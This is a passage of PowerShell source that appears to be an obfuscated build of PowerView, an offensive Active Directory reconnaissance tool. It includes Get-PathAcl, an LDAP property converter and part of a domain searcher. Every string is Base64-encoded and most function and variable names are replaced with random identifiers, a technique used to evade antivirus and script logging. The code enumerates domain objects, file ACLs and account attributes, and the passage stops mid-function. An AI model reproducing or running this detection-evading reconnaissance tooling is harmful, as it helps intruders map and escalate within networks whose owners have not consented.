        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        c4bfd1c2423d4aa09ab761a468a38f7e @fd6c4173863b4be9aa10603a30f19bb1 | Where-Object {$_.samaccountname -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA')))} | e510eb37ce3849408f84b7fb0ba9b850 -OutputFormat $OutputFormat
    }
    END {
        if (${9d861c835c924c73aa92c66fb935caca}) {
            dcf0a8b111a84302b05d40b1db05338c -d4e1296b557440d7b406a9378e307719 ${9d861c835c924c73aa92c66fb935caca}
        }
    }
}
function Get-PathAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function aa01e84ba71f493b898b46a5524b3657 {
            [CmdletBinding()]
            Param(
                [Int]
                ${e10caac800ff4e78b516fe9183070f24}
            )
            ${5914f71348874dde8b4263d3b8eab7d2} = @{
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADgAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBSAGUAYQBkAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBXAHIAaQB0AGUA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBFAHgAZQBjAHUAdABlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBBAGwAbABvAHcAZQBkAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMQAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAUwB5AHMAdABlAG0AUwBlAGMAdQByAGkAdAB5AA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAxADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AG4AYwBoAHIAbwBuAGkAegBlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADgAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE8AdwBuAGUAcgA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADQAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEQAQQBDAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADIAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABDAG8AbgB0AHIAbwBsAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADEAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAxADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEEAdAB0AHIAaQBiAHUAdABlAHMA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADgAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAHQAdAByAGkAYgB1AHQAZQBzAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADQAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAQwBoAGkAbABkAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQAvAFQAcgBhAHYAZQByAHMAZQA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEUAeAB0AGUAbgBkAGUAZABBAHQAdAByAGkAYgB1AHQAZQBzAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABFAHgAdABlAG4AZABlAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAZQBuAGQARABhAHQAYQAvAEEAZABkAFMAdQBiAGQAaQByAGUAYwB0AG8AcgB5AA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEQAYQB0AGEALwBBAGQAZABGAGkAbABlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABEAGEAdABhAC8ATABpAHMAdABEAGkAcgBlAGMAdABvAHIAeQA=')))
            }
            ${18e1dd138f874cb89e6372f01563eeb0} = @{
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAZgAwADEAZgBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgB1AGwAbABDAG8AbgB0AHIAbwBsAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMwAwADEAYgBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAGQAaQBmAHkA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAYQA5AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABFAHgAZQBjAHUAdABlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADEAOQBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABXAHIAaQB0AGUA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAOAA5AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZAA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADEAMQA2AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA==')))
            }
            ${8c99780cc39345ad8b12f181fe3a5fd7} = @()
            ${8c99780cc39345ad8b12f181fe3a5fd7} += ${18e1dd138f874cb89e6372f01563eeb0}.Keys | ForEach-Object {
                              if ((${e10caac800ff4e78b516fe9183070f24} -band $_) -eq $_) {
                                ${18e1dd138f874cb89e6372f01563eeb0}[$_]
                                ${e10caac800ff4e78b516fe9183070f24} = ${e10caac800ff4e78b516fe9183070f24} -band (-not $_)
                              }
                            }
            ${8c99780cc39345ad8b12f181fe3a5fd7} += ${5914f71348874dde8b4263d3b8eab7d2}.Keys | Where-Object { ${e10caac800ff4e78b516fe9183070f24} -band $_ } | ForEach-Object { ${5914f71348874dde8b4263d3b8eab7d2}[$_] }
            (${8c99780cc39345ad8b12f181fe3a5fd7} | Where-Object {$_}) -join ','
        }
        ${361a580794ef4c89844cfea6747040fa} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${361a580794ef4c89844cfea6747040fa}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${a7a08ce980304e968286c9b55cb03dc0} = @{}
    }
    PROCESS {
        ForEach (${f2c826b07a43443aaca3dc6e400f36f1} in $Path) {
            try {
                if ((${f2c826b07a43443aaca3dc6e400f36f1} -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                    ${a7323df48bb0410394bda78f8d71db4a} = (New-Object System.Uri(${f2c826b07a43443aaca3dc6e400f36f1})).Host
                    if (-not ${a7a08ce980304e968286c9b55cb03dc0}[${a7323df48bb0410394bda78f8d71db4a}]) {
                        b62ba051179546ed8285f6844e069492 -ac645935110b4eaea96e7bf6f0b2d7f4 ${a7323df48bb0410394bda78f8d71db4a} -Credential $Credential
                        ${a7a08ce980304e968286c9b55cb03dc0}[${a7323df48bb0410394bda78f8d71db4a}] = $True
                    }
                }
                ${9decc31aa5494a009504db9e45778387} = Get-Acl -Path ${f2c826b07a43443aaca3dc6e400f36f1}
                ${9decc31aa5494a009504db9e45778387}.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    ${80e0799324a04d1fa162e12bab203710} = $_.IdentityReference.Value
                    $Name = e867aff561cb4dacb74c955fc46aa9c1 -23ca6558fa4b4ce695fc6d89d0b892e5 ${80e0799324a04d1fa162e12bab203710} @361a580794ef4c89844cfea6747040fa
                    ${135b3fb143bd49b987991226741987e6} = New-Object PSObject
                    ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) ${f2c826b07a43443aaca3dc6e400f36f1}
                    ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBTAHkAcwB0AGUAbQBSAGkAZwBoAHQAcwA='))) (aa01e84ba71f493b898b46a5524b3657 -e10caac800ff4e78b516fe9183070f24 $_.FileSystemRights.value__)
                    ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAA=='))) $Name
                    ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFMASQBEAA=='))) ${80e0799324a04d1fa162e12bab203710}
                    ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAQwBvAG4AdAByAG8AbABUAHkAcABlAA=='))) $_.AccessControlType
                    ${135b3fb143bd49b987991226741987e6}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAGkAbABlAEEAQwBMAA=='))))
                    ${135b3fb143bd49b987991226741987e6}
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAYQB0AGgAQQBjAGwAXQAgAGUAcgByAG8AcgA6ACAAJABfAA==')))
            }
        }
    }
    END {
        ${a7a08ce980304e968286c9b55cb03dc0}.Keys | a7d442a86d1b4ceeaa8f4ca925e39550
    }
}
function ac8c47b8977f4b0f9b4bbd3cb21b1a28 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )
    ${819b1b7744a2472cb2177dbd6e99d815} = @{}
    $Properties.PropertyNames | ForEach-Object {
        if ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHMAcABhAHQAaAA=')))) {
            if (($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAGQAaABpAHMAdABvAHIAeQA='))))) {
                ${819b1b7744a2472cb2177dbd6e99d815}[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAHQAeQBwAGUA')))) {
                ${819b1b7744a2472cb2177dbd6e99d815}[$_] = $Properties[$_][0] -as ${b3039f6a810949a6b0f567114730e772}
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA==')))) {
                ${819b1b7744a2472cb2177dbd6e99d815}[$_] = $Properties[$_][0] -as ${c0d863838e2340d4891deedd48712542}
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA=')))) {
                ${819b1b7744a2472cb2177dbd6e99d815}[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA')))) {
                ${819b1b7744a2472cb2177dbd6e99d815}[$_] = $Properties[$_][0] -as ${ad9be41dbd0943c2b70046d95a560c23}
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB0AHMAZQBjAHUAcgBpAHQAeQBkAGUAcwBjAHIAaQBwAHQAbwByAA==')))) {
                ${83492650ee8747619d9a3432f84a6954} = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                if (${83492650ee8747619d9a3432f84a6954}.Owner) {
                    ${819b1b7744a2472cb2177dbd6e99d815}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA==')))] = ${83492650ee8747619d9a3432f84a6954}.Owner
                }
                if (${83492650ee8747619d9a3432f84a6954}.Group) {
                    ${819b1b7744a2472cb2177dbd6e99d815}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))] = ${83492650ee8747619d9a3432f84a6954}.Group
                }
                if (${83492650ee8747619d9a3432f84a6954}.DiscretionaryAcl) {
                    ${819b1b7744a2472cb2177dbd6e99d815}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYwByAGUAdABpAG8AbgBhAHIAeQBBAGMAbAA=')))] = ${83492650ee8747619d9a3432f84a6954}.DiscretionaryAcl
                }
                if (${83492650ee8747619d9a3432f84a6954}.SystemAcl) {
                    ${819b1b7744a2472cb2177dbd6e99d815}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0AQQBjAGwA')))] = ${83492650ee8747619d9a3432f84a6954}.SystemAcl
                }
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA==')))) {
                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    ${819b1b7744a2472cb2177dbd6e99d815}[$_] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFYARQBSAA==')))
                }
                else {
                    ${819b1b7744a2472cb2177dbd6e99d815}[$_] = [datetime]::fromfiletime($Properties[$_][0])
                }
            }
            elseif ( ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA=')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA=')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAUABhAHMAcwB3AG8AcgBkAFQAaQBtAGUA')))) ) {
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    ${54bb3c44a4d54e2393ac11ebfa0656c0} = $Properties[$_][0]
                    [Int32]${087417809b9f429dafc65788dfd398dd} = ${54bb3c44a4d54e2393ac11ebfa0656c0}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [System.Reflection.BindingFlags]::GetProperty, $Null, ${54bb3c44a4d54e2393ac11ebfa0656c0}, $Null)
                    [Int32]${5bb8b030cee347178b2cc934571ac59e}  = ${54bb3c44a4d54e2393ac11ebfa0656c0}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))),  [System.Reflection.BindingFlags]::GetProperty, $Null, ${54bb3c44a4d54e2393ac11ebfa0656c0}, $Null)
                    ${819b1b7744a2472cb2177dbd6e99d815}[$_] = ([datetime]::FromFileTime([Int64]($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AHgAOAB9AHsAMQA6AHgAOAB9AA=='))) -f ${087417809b9f429dafc65788dfd398dd}, ${5bb8b030cee347178b2cc934571ac59e})))
                }
                else {
                    ${819b1b7744a2472cb2177dbd6e99d815}[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                ${be95e73932d24f9fa17d0c6c6e8253f6} = $Properties[$_]
                try {
                    ${54bb3c44a4d54e2393ac11ebfa0656c0} = ${be95e73932d24f9fa17d0c6c6e8253f6}[$_][0]
                    [Int32]${087417809b9f429dafc65788dfd398dd} = ${54bb3c44a4d54e2393ac11ebfa0656c0}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [System.Reflection.BindingFlags]::GetProperty, $Null, ${54bb3c44a4d54e2393ac11ebfa0656c0}, $Null)
                    [Int32]${5bb8b030cee347178b2cc934571ac59e}  = ${54bb3c44a4d54e2393ac11ebfa0656c0}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))),  [System.Reflection.BindingFlags]::GetProperty, $Null, ${54bb3c44a4d54e2393ac11ebfa0656c0}, $Null)
                    ${819b1b7744a2472cb2177dbd6e99d815}[$_] = [Int64]($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AHgAOAB9AHsAMQA6AHgAOAB9AA=='))) -f ${087417809b9f429dafc65788dfd398dd}, ${5bb8b030cee347178b2cc934571ac59e})
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AC0ATABEAEEAUABQAHIAbwBwAGUAcgB0AHkAXQAgAGUAcgByAG8AcgA6ACAAJABfAA==')))
                    ${819b1b7744a2472cb2177dbd6e99d815}[$_] = ${be95e73932d24f9fa17d0c6c6e8253f6}[$_]
                }
            }
            elseif ($Properties[$_].count -eq 1) {
                ${819b1b7744a2472cb2177dbd6e99d815}[$_] = $Properties[$_][0]
            }
            else {
                ${819b1b7744a2472cb2177dbd6e99d815}[$_] = $Properties[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property ${819b1b7744a2472cb2177dbd6e99d815}
    }
    catch {
        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AC0ATABEAEEAUABQAHIAbwBwAGUAcgB0AHkAXQAgAEUAcgByAG8AcgAgAHAAYQByAHMAaQBuAGcAIABMAEQAQQBQACAAcAByAG8AcABlAHIAdABpAGUAcwAgADoAIAAkAF8A')))
    }
}
function d99af1f025294e4b8cf632a3987179c6 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [String]
        ${aefd941b8b2f4caba5e719a2833d4840},
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            $TargetDomain = $Domain
            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                $UserDomain = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
                    ${87b2fc228cd84170a2c5893a2fbbfd04} = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${03f0e142a42041cd9496f2560bd34d4e} = c57d9aa48a49482b961291cafd0dde18 -Credential $Credential
            ${87b2fc228cd84170a2c5893a2fbbfd04} = (${03f0e142a42041cd9496f2560bd34d4e}.PdcRoleOwner).Name
            $TargetDomain = ${03f0e142a42041cd9496f2560bd34d4e}.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            $TargetDomain = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {
                ${87b2fc228cd84170a2c5893a2fbbfd04} = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            write-verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBlAHQALQBkAG8AbQBhAGkAbgA=')))
            ${03f0e142a42041cd9496f2560bd34d4e} = c57d9aa48a49482b961291cafd0dde18
            ${87b2fc228cd84170a2c5893a2fbbfd04} = (${03f0e142a42041cd9496f2560bd34d4e}.PdcRoleOwner).Name
            $TargetDomain = ${03f0e142a42041cd9496f2560bd34d4e}.Name
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
            ${87b2fc228cd84170a2c5893a2fbbfd04} = $Server
        }
        ${13fd64d261d64452afe3fd6a08d31e4c} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwA=')))
        if (${87b2fc228cd84170a2c5893a2fbbfd04} -and (${87b2fc228cd84170a2c5893a2fbbfd04}.Trim() -ne '')) {
            ${13fd64d261d64452afe3fd6a08d31e4c} += ${87b2fc228cd84170a2c5893a2fbbfd04}
            if ($TargetDomain) {
                ${13fd64d261d64452afe3fd6a08d31e4c} += '/'
            }
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQBQAHIAZQBmAGkAeAA=')))]) {
            ${13fd64d261d64452afe3fd6a08d31e4c} += ${aefd941b8b2f4caba5e719a2833d4840} + ','
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) {
            if ($SearchBase -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBHAEMAOgAvAC8A')))) {
